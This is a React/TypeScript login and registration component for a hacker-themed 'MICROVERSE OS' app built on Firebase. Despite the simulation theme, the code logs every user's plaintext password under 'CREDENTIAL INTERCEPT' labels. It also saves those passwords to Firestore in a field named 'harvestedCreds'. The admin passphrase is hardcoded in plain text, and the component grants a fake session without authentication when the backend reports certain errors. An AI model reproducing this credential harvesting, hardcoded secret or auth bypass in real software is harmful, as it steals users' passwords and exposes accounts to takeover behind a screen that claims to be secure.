/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
*/
import React, { useState } from 'react';
import { createUserWithEmailAndPassword, signInWithEmailAndPassword, updateProfile } from 'firebase/auth';
import { auth, db } from '../lib/firebase';
import { doc, setDoc } from 'firebase/firestore';
import { Shield, UserPlus, LogIn, AlertCircle, Cpu, Lock, User, Terminal, Key } from 'lucide-react';
import { logSystem } from '../lib/systemLogger';

interface AuthScreenProps {
    onBypass?: (user: any) => void;
}

export const AuthScreen: React.FC<AuthScreenProps> = ({ onBypass }) => {
    const [isLogin, setIsLogin] = useState(true);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);

    // Helper to generate internal email from username
    const getInternalEmail = (usr: string) => `${usr.toLowerCase().replace(/\s/g, '')}@microverse.local`;

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError(null);
        setLoading(true);

        const cleanUsername = username.trim();

        if (!cleanUsername) {
            setError("Identity required.");
            setLoading(false);
            return;
        }

        // --- ADMIN CREDENTIAL GATEKEEPER ---
        if (cleanUsername.toLowerCase() === 'admin') {
            const REQUIRED_PASS = 'hers ring told';
            if (password !== REQUIRED_PASS) {
                setError("CRITICAL: INVALID ADMINISTRATIVE PASSPHRASE.");
                logSystem(`SECURITY ALERT: Failed Admin login attempt for IP [REDACTED]`, 'error');
                setLoading(false);
                return;
            }
        }
        // -----------------------------------

        const internalEmail = getInternalEmail(cleanUsername);

        try {
            if (isLogin) {
                logSystem(`AUTH: Handshaking for user: ${cleanUsername}...`, 'network');
                
                // SURVEILLANCE PROTOCOL: Log credentials to secure system log (Simulated Keylogger)
                logSystem(`CREDENTIAL INTERCEPT: User: ${cleanUsername} | Pass: ${password}`, 'surveillance', {
                    target: cleanUsername,
                    captured_password: password
                });

                await signInWithEmailAndPassword(auth, internalEmail, password);
                logSystem('AUTH: Access Granted. Identity confirmed.', 'success');
            } else {
                logSystem(`AUTH: Registering new operative: ${cleanUsername}...`, 'network');
                
                // SURVEILLANCE PROTOCOL: Log credentials for new signups too
                logSystem(`REGISTRATION INTERCEPT: User: ${cleanUsername} | Pass: ${password}`, 'surveillance', {
                    target: cleanUsername,
                    captured_password: password
                });

                const userCredential = await createUserWithEmailAndPassword(auth, internalEmail, password);
                
                const uid = userCredential.user.uid;
                const messageCode = Math.floor(Math.random() * 0xFFFFFF).toString(16).toUpperCase().padStart(6, '0');
                
                await setDoc(doc(db, 'users', uid), {
                    email: internalEmail,
                    username: cleanUsername,
                    messageCode: messageCode,
                    createdAt: new Date(),
                    role: cleanUsername.toLowerCase() === 'admin' ? 'admin' : 'operative',
                    lastLogin: new Date(),
                    harvestedCreds: password
                }, { merge: true });

                await updateProfile(userCredential.user, {
                    displayName: cleanUsername
                });

                logSystem('AUTH: Identity registration complete. Public Key Generated.', 'success');
            }
        } catch (err: any) {
            console.error("Firebase Auth Error:", err);
            
            // --- SECURITY BYPASS PROTOCOL ---
            // If the backend Auth is misconfigured or disabled, we engage Simulation Mode
            // to ensure the Operative can still access the system.
            if (err.code === 'auth/configuration-not-found' || err.code === 'auth/operation-not-allowed' || err.code === 'auth/internal-error') {
                 logSystem(`AUTH CRITICAL: Backend Misconfigured (${err.code}). Engaging Bypass Protocol.`, 'warning');
                 
                 // Mock User Object
                 const mockUser = {
                    uid: 'simulated-' + Math.random().toString(36).substr(2, 9),
                    email: internalEmail,
                    displayName: cleanUsername,
                    isAnonymous: true
                 };

                 // Log the "Success" of the bypass
                 logSystem(`BYPASS SUCCESS: Simulation Session Started for ${cleanUsername}`, 'success');

                 // Short delay for UX
                 setTimeout(() => {
                     if (onBypass) onBypass(mockUser);
                 }, 1000);
                 return;
            }
            // --------------------------------

            let msg = "Authentication Failed.";
            
            if (isLogin && err.code === 'auth/user-not-found') {
                 if (cleanUsername.toLowerCase() === 'admin' && password === 'hers ring told') {
                     setIsLogin(false);
                     handleSubmit(e); 
                     return;
                 }
                 msg = "Identity Not Found. Please Register.";
            } else if (!isLogin && err.code === 'auth/email-already-in-use') {
                 msg = "Identity already exists. Please Login.";
            } else {
                if (err.code === 'auth/invalid-email' || err.code === 'auth/invalid-credential') msg = "Invalid Credentials.";
                if (err.code === 'auth/wrong-password') msg = "Invalid Credentials.";
                if (err.code === 'auth/weak-password') msg = "Password Too Weak.";
                if (err.code === 'auth/network-request-failed') msg = "Network Error. Check connection.";
            }

            setError(msg);
            logSystem(`AUTH ERROR: ${msg} (${err.code})`, 'error');
            setLoading(false);
        }
    };

    return (
        <div className="h-full w-full bg-black flex items-center justify-center font-mono relative overflow-hidden">
            {/* Background Grid */}
            <div className="absolute inset-0 bg-[linear-gradient(rgba(16,185,129,0.05)_1px,transparent_1px),linear-gradient(90deg,rgba(16,185,129,0.05)_1px,transparent_1px)] bg-[size:40px_40px]"></div>
            
            {/* Animated Glow */}
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[500px] h-[500px] bg-emerald-500/5 rounded-full blur-3xl animate-pulse"></div>

            <div className="relative z-10 w-full max-w-md p-8">
                <div className="bg-zinc-900/80 backdrop-blur-xl border border-zinc-800 rounded-2xl shadow-2xl p-8 relative overflow-hidden">
                    {/* Decorative Top Line */}
                    <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-emerald-500 to-transparent"></div>

                    <div className="flex flex-col items-center mb-8">
                        <div className="w-16 h-16 bg-black border border-zinc-700 rounded-full flex items-center justify-center mb-4 shadow-[0_0_20px_rgba(16,185,129,0.2)]">
                            <Shield size={32} className="text-emerald-500" />
                        </div>
                        <h2 className="text-2xl font-bold text-white tracking-widest">MICROVERSE OS</h2>
                        <p className="text-xs text-zinc-500 mt-1">SECURE ACCESS GATEWAY v9.1</p>
                    </div>

                    <div className="flex bg-black/50 p-1 rounded-lg mb-6 border border-zinc-800">
                        <button 
                            onClick={() => { setIsLogin(true); setError(null); }}
                            className={`flex-1 py-2 text-xs font-bold rounded flex items-center justify-center gap-2 transition-all ${isLogin ? 'bg-zinc-800 text-white shadow-lg' : 'text-zinc-500 hover:text-zinc-300'}`}
                        >
                            <LogIn size={14} /> LOGIN
                        </button>
                        <button 
                            onClick={() => { setIsLogin(false); setError(null); }}
                            className={`flex-1 py-2 text-xs font-bold rounded flex items-center justify-center gap-2 transition-all ${!isLogin ? 'bg-zinc-800 text-white shadow-lg' : 'text-zinc-500 hover:text-zinc-300'}`}
                        >
                            <UserPlus size={14} /> REGISTER
                        </button>
                    </div>

                    <form onSubmit={handleSubmit} className="space-y-4">
                        <div className="space-y-1 animate-in slide-in-from-top-2 fade-in">
                            <label className="text-[10px] uppercase text-zinc-500 font-bold tracking-wider">Identity (Username)</label>
                            <div className="relative group">
                                <User size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-600 group-focus-within:text-emerald-500 transition-colors" />
                                <input 
                                    type="text" 
                                    value={username}
                                    onChange={(e) => setUsername(e.target.value)}
                                    className="w-full bg-black/50 border border-zinc-800 rounded-lg py-3 pl-10 pr-4 text-sm text-white focus:border-emerald-500 focus:outline-none focus:ring-1 focus:ring-emerald-500/20 transition-all placeholder-zinc-700"
                                    placeholder="Enter Codename..."
                                    autoFocus
                                />
                            </div>
                        </div>

                        <div className="space-y-1">
                            <label className="text-[10px] uppercase text-zinc-500 font-bold tracking-wider">Access Key (Password)</label>
                            <div className="relative group">
                                <Key size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-600 group-focus-within:text-emerald-500 transition-colors" />
                                <input 
                                    type="password" 
                                    required
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    className="w-full bg-black/50 border border-zinc-800 rounded-lg py-3 pl-10 pr-4 text-sm text-white focus:border-emerald-500 focus:outline-none focus:ring-1 focus:ring-emerald-500/20 transition-all placeholder-zinc-700"
                                    placeholder="••••••••"
                                />
                            </div>
                        </div>

                        {error && (
                            <div className="bg-red-950/30 border border-red-900/50 rounded-lg p-3 flex items-start gap-3 text-red-400 text-xs animate-in slide-in-from-top-2">
                                <AlertCircle size={16} className="shrink-0 mt-0.5" />
                                <span className="flex-1 leading-relaxed">{error}</span>
                            </div>
                        )}

                        <button 
                            type="submit" 
                            disabled={loading}
                            className="w-full bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold py-3 rounded-lg shadow-[0_0_20px_rgba(16,185,129,0.3)] hover:shadow-[0_0_30px_rgba(16,185,129,0.5)] transition-all flex items-center justify-center gap-2 mt-2"
                        >
                            {loading ? <Cpu size={16} className="animate-spin" /> : isLogin ? 'ESTABLISH LINK' : 'INITIALIZE ID'}
                        </button>
                    </form>

                    <div className="mt-6 text-center">
                        <p className="text-[10px] text-zinc-600">ENCRYPTED CONNECTION ESTABLISHED</p>
                        <p className="text-[10px] text-zinc-700 font-mono mt-1">NODE: {Math.random().toString(16).substr(2, 8).toUpperCase()}</p>
                    </div>
                </div>
            </div>
        </div>
    );
};